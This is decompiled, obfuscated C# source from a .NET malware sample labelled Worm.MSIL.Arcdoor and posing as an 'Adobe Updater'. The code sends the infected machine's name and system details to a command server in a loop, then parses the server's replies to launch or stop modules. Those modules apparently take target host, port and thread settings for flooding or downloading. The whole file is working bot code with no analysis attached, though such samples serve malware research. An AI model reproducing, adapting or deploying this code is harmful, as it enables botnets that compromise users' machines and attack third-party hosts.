// Decompiled with JetBrains decompiler
// Type:  
// Assembly: Adobe Updater, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3EBFD65F-C01D-4B08-A6E5-41C787EE6341
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\Worm.MSIL.Arcdoor.vps-5c5e242af096e77e0fc4a037a0fee5d20df072b9dc640e5ae36ec0f0f68ad065.exe

using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;

internal sealed class \u0005\u2000
{
  private static Random \u0002 = new Random();
  private static \u0008 \u0003 = new \u0008();
  private static int \u0005 = \u0005\u2000.\u0002.Next(2000, 20000);

  private static void \u0002(string[] _param0)
  {
    \u000F obj = new \u000F(\u000E\u2001.\u000F);
    new \u0006().\u0002();
    string str1 = string.Empty;
    new Thread(new ThreadStart(\u0002\u2001.\u0002)).Start();
    while (true)
    {
      string str2 = \u000F\u2001.\u0002(670213638) + Environment.MachineName + \u000F\u2001.\u0002(670213652) + \u000E\u2001.\u000E + \u000F\u2001.\u0002(670213667) + \u0002.\u0005().ToLower() + \u000F\u2001.\u0002(670213683) + \u0002.\u0002() + \u000F\u2001.\u0002(670213698) + \u0002.\u000E() + \u000F\u2001.\u0002(670213727) + \u0002.\u0008();
      string str3 = \u0005\u2000.\u0002(\u000E\u2001.\u0008, str2);
      if (str3.Length != 0 && str3 != str1)
      {
        \u0005\u2000.\u0002();
        \u0005\u2000.\u0002(str3);
        str1 = str3;
      }
      Thread.Sleep(\u000E\u2001.\u0003);
    }
  }

  public static void \u0002()
  {
    if (\u0003\u2001.\u0003\u2000)
    {
      \u0003\u2001.\u0003();
      \u0003\u2001.\u0003\u2000 = false;
    }
    if (\u0005\u2001.\u0005\u2000)
    {
      \u0005\u2001.\u0003();
      \u0005\u2001.\u0005\u2000 = false;
    }
    if (!\u0005\u2000.\u0003.\u0006)
      return;
    \u0005\u2000.\u0003.\u0003();
    \u0005\u2000.\u0003.\u0006 = false;
  }

  public static string \u0002(string _param0, string _param1)
  {
    try
    {
      ServicePointManager.Expect100Continue = false;
      WebRequest webRequest = WebRequest.Create(_param0);
      webRequest.ContentType = \u000F\u2001.\u0002(670213738);
      webRequest.Method = \u000F\u2001.\u0002(670212482);
      byte[] bytes = Encoding.ASCII.GetBytes(_param1);
      webRequest.ContentLength = (long) bytes.Length;
      Stream requestStream = webRequest.GetRequestStream();
      requestStream.Write(bytes, 0, bytes.Length);
      requestStream.Close();
      WebResponse response = webRequest.GetResponse();
      return response == null ? (string) null : new StreamReader(response.GetResponseStream()).ReadToEnd().Trim();
    }
    catch
    {
      \u0005\u2000.\u0002();
      string str = \u000F\u2001.\u0002(670213638) + Environment.MachineName + \u000F\u2001.\u0002(670213652) + \u000E\u2001.\u000E + \u000F\u2001.\u0002(670213667) + \u0002.\u0005().ToLower() + \u000F\u2001.\u0002(670213683) + \u0002.\u0002() + \u000F\u2001.\u0002(670213698) + \u0002.\u000E() + \u000F\u2001.\u0002(670213727) + \u0002.\u0008();
      \u0005\u2000.\u0002(\u000E\u2001.\u0006, str);
      return string.Empty;
    }
  }

  private static void \u0002(string _param0)
  {
    string[] strArray = _param0.Split('*');
    if (_param0.StartsWith(\u000F\u2001.\u0002(670212509)))
    {
      try
      {
        \u0005\u2000.\u0002();
        \u0005.\u0002(strArray[1]);
      }
      catch
      {
      }
    }
    if (_param0.StartsWith(\u000F\u2001.\u0002(670212503)))
    {
      try
      {
        \u0005\u2000.\u0002();
        \u0005.\u0002(strArray[1]);
        \u0008\u2001.\u0003();
      }
      catch
      {
      }
    }
    if (_param0.StartsWith(\u000F\u2001.\u0002(670212517)))
    {
      try
      {
        \u0005\u2000.\u0002();
        \u0003\u2001.\u0005 = strArray[1];
        \u0003\u2001.\u0006 = Convert.ToInt32(strArray[2]);
        \u0003\u2001.\u0002\u2000 = Convert.ToInt32(strArray[3]);
        \u0003\u2001.\u000F = Convert.ToInt32(strArray[4]);
        \u0003\u2001.\u0002();
      }
      catch
      {
      }
    }
    if (_param0.StartsWith(\u000F\u2001.\u0002(670212528)))
    {
      try
      {
        \u0005\u2000.\u0002();
        \u0005\u2001.\u0005 = strArray[1];
        \u0005\u2001.\u0006 = Convert.ToInt32(strArray[2]);
        \u0005\u2001.\u0002\u2000 = Convert.ToInt32(strArray[3]);
        \u0005\u2001.\u0003\u2000 = Convert.ToInt32(strArray[4]);
        \u0005\u2001.\u000E = Convert.ToInt32(strArray[5]);
        \u0005\u2001.\u0002();
      }
      catch
      {
      }
    }
    if (!_param0.StartsWith(\u000F\u2001.\u0002(670212555)))
      return;
    try
    {
      \u0005\u2000.\u0002();
      if (strArray[1].Contains(\u000F\u2001.\u0002(670212551)))
      {
        string str1 = strArray[1];
      }
      else
      {
        string str2 = \u000F\u2001.\u0002(670212563) + strArray[1];
      }
      \u0005\u2000.\u0003.\u0005 = strArray[1];
      \u0005\u2000.\u0003.\u0002();
      \u0005\u2000.\u0003.\u0006 = true;
    }
    catch
    {
    }
  }
}
